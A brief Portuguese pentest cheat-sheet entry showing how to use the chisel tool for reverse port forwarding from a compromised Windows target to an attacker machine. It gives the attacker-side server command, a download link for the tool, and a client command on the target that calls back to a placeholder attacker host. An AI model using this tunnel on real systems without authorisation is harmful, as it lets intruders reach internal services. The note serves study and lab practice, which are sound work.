Encaminhamento de porta pode ser utilizado para acessar da máquina atacante, uma porta aberta localmente no alvo.

Na maquina atacante:
```bash
# Iniciando o chisel e indicando a porta que receberá a conexão
chisel server -p 9999 --reverse
```

No alvo (Windows):
Link para download: https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_amd64.gz

```powershell
# Sobe o executável para a máquina alvo
chisel.exe client <LHOST>:9999 R:<RPORT>:127.0.0.1:<RPORT>
```